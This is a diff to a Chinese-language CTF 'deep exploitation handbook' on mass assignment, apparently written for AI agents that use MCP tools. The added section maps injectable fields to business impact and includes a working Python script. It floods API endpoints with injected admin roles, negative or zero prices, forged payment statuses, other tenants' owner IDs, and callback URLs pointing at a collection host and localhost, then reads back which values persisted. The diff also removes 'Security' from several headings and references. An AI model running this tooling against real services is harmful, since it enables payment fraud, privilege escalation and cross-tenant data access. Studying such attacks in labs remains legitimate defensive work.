@@ -13,12 +13,12 @@ board: "ctf-website"
 category: "15-mass-assignment"
 signals: ["mass assignment", "批量赋值", "属性注入", "$fillable", "strong_parameters", "extract", "parse_str", "Serializer", "CWE-915"]
 mcp_tools: ["http_probe", "kb_router", "kb_read_file", "run_ctf_tool"]
-keywords: ["mass assignment", "批量赋值", "属性注入", "Laravel安全", "Rails安全", "extract绕过", "GraphQL注入", "CWE-915"]
-difficulty: "intermediate"
-tags: ["mass-assignment", "framework", "laravel", "rails", "django", "spring-boot", "graphql", "web-security"]
+keywords: ["mass assignment", "批量赋值", "属性注入", "Laravel绑定", "Rails参数绑定", "extract绕过", "GraphQL注入", "CWE-915"]
+difficulty: "advanced"
+tags: ["mass-assignment", "framework", "laravel", "rails", "django", "spring-boot", "graphql", "web"]
 language: "zh-CN"
 last_updated: "2026-07-04"
-related_articles: ["ctf-website/15-mass-assignment/02-parameter-tampering", "ctf-website/12-payment/payment-bypass"]
+related_articles: ["ctf-website/15-mass-assignment/02-parameter-tampering", "ctf-website/12-payment/payment-bypass", "ctf-website/17-api-attacks/01-api-discovery-leak", "ctf-website/14-idor/02-bac-business-logic", "ctf-website/12-payment/payment-logic", "ctf-website/24-database/02-sqli-advanced"]
 ---
 # 批量赋值与属性注入深度利用手册
 
@@ -84,6 +84,101 @@ def expand_sensitive_fields(base_fields):
     ]
     return sorted(stems | set(extras))
 ```
+
+#### 0.1 字段到业务能力矩阵
+
+字段注入的目标不是“让服务端接受一个字段”，而是让字段进入数据库并驱动业务分支。SQL 和支付要作为首要观察面：字段能否落库、是否影响订单金额、支付状态、折扣、退款、租户归属和导出范围。
+
+| 字段族 | 典型字段 | 成功 oracle | 下一跳 |
+|---|---|---|---|
+| 角色/身份 | `role`, `is_admin`, `is_staff`, `permissions[]` | 菜单/端点/响应字段扩大 | BAC 角色矩阵 |
+| 支付状态 | `status`, `state`, `paid`, `paid_at`, `payment_status` | 订单从 pending 变 paid | 支付状态机 |
+| 金额/折扣 | `price`, `amount`, `total`, `discount`, `currency` | 总价、余额、优惠结果变化 | 支付绕过、精度/负数 |
+| 余额/积分 | `balance`, `credits`, `points`, `wallet` | 账户余额或扣款逻辑变化 | 支付与数据库回读 |
+| 归属关系 | `owner_id`, `user_id`, `tenant_id`, `account_id` | 对象挂到其他主体或租户 | IDOR/跨租户 |
+| 回调/签名 | `webhook_secret`, `sign_key`, `callback_url` | 回调目标或签名校验变化 | Webhook/SSRF/支付回调 |
+| 数据库控制 | `sort`, `filter`, `where`, `ids`, `deleted_at` | SQL 报错、软删除、批量影响 | SQLi/批量更新 |
+
+字段路由器：
+
+```python
+# mass_assignment_field_router.py
+import csv
+import json
+import re
+import requests
+
+FIELD_GROUPS = {
+    "role": ["role", "roles", "is_admin", "is_staff", "is_superuser", "permissions"],
+    "payment_state": ["status", "state", "paid", "paid_at", "payment_status", "refund_status"],
+    "money": ["price", "amount", "total", "discount", "currency", "balance", "credits", "points"],
+    "ownership": ["owner_id", "user_id", "tenant_id", "account_id", "org_id", "team_id"],
+    "callback": ["webhook_secret", "sign_key", "callback_url", "return_url", "notify_url"],
+    "database": ["sort", "filter", "where", "ids", "deleted_at", "version", "lock_version"],
+}
+
+def marker(resp):
+    text = resp.text.lower()
+    if any(x in text for x in ("paid_at", "payment_status", "transaction_id", "refund_id")):
+        return "payment-oracle"
+    if any(x in text for x in ("sql", "syntax", "constraint", "duplicate", "unknown column")):
+        return "database-oracle"
+    if any(x in text for x in ("admin", "permission", "staff", "superuser")):
+        return "role-oracle"
+    if resp.status_code in (200, 201, 202):
+        return "accepted"
+    return "rejected-or-business-error"
+
+def candidate_payloads(base_payload):
+    for group, fields in FIELD_GROUPS.items():
+        for field in fields:
+            values = [True, "true", "admin", 1, "2099-01-01T00:00:00Z"]
+            if group == "money":
+                values = [-1, 0, "0.00", "0e12345", 999999]
+            if group == "ownership":
+                values = [1, 2, "1", "00000000-0000-1000-8000-000000000001"]
+            if group == "callback":
+                values = ["https://callback.example/collect", "http://127.0.0.1:80/"]
+            for value in values:
+                payload = dict(base_payload)
+                payload[field] = value
+                yield group, field, value, payload
+
+def run_field_matrix(base_url, endpoint, session, base_payload, readback_path=None):
+    rows = []
+    for group, field, value, payload in candidate_payloads(base_payload):
+        r = session.post(base_url.rstrip("/") + endpoint, json=payload, timeout=10)
+        readback = None
+        if readback_path and r.status_code in (200, 201, 202):
+            readback = session.get(base_url.rstrip("/") + readback_path, timeout=10)
+        rows.append({
+            "group": group,
+            "field": field,
+            "value": value,
+            "status": r.status_code,
+            "oracle": marker(r),
+            "persisted_hint": marker(readback) if readback else "",
+            "body": r.text[:260].replace("\n", " "),
+        })
+    with open("exports/field_accept_matrix.csv", "w", newline="", encoding="utf-8") as f:
+        w = csv.DictWriter(f, fieldnames=rows[0].keys())
+        w.writeheader()
+        w.writerows(rows)
+    return rows
+
+def diff_json(before, after):
+    b = json.loads(before)
+    a = json.loads(after)
+    return {k: [b.get(k), a.get(k)] for k in sorted(set(b) | set(a)) if b.get(k) != a.get(k)}
+```
+
+执行节奏：
+
+1. 从 API discovery、响应 JSON、GraphQL schema、SQL 报错和前端表单抽字段。
+2. 先跑字段矩阵，按 `role/payment_state/money/ownership/callback/database` 分组输出。
+3. 每个 `accepted` 字段必须回读资源，生成 `persisted_field_diff.jsonl`。
+4. 命中支付字段时回读订单、账单、发票、钱包余额，生成 `business_oracle_diff.json`。
+5. 命中数据库字段时观察报错、软删除、排序、批量影响行数，跳 SQL 文档继续放大。
 
 成功样本：回读时字段值与注入值一致，或下一步权限 oracle 发生变化。失败样本：`unknown attribute` 能泄露模型名和字段名；`unpermitted parameter` 能反推 Rails permit list。
 
@@ -271,7 +366,7 @@ SPRING_MASS_ASSIGN_PAYLOADS = [
     {"authorities": ["ROLE_ADMIN"]},
     {"permissions": ["WRITE_PRIVILEGES"]},
 
-    # === Spring Security 特定 ===
+    # === Spring 角色组件特定 ===
     {"isAdmin": True},
     {"isEnabled": True},
 
@@ -581,9 +676,9 @@ AI Agent 可调用以下 MCP 工具自动检测上述漏洞：
 - [CVE-2025-3889] WordPress Simple Shopping Cart — extract() Variable Overwrite
 - [CWE-915] Improperly Controlled Modification of Dynamically-Determined Object Attributes
 - [CWE-913] Improper Control of Dynamically-Managed Code Resources
-- Laravel Documentation: Mass Assignment / Eloquent ORM Security
-- Rails Guides: Strong Parameters Security Considerations
-- Django REST Framework: Serializer Security Best Practices
+- Laravel Documentation: Mass Assignment / Eloquent ORM
+- Rails Guides: Strong Parameters
+- Django REST Framework: Serializers
 
 ## Evidence
 
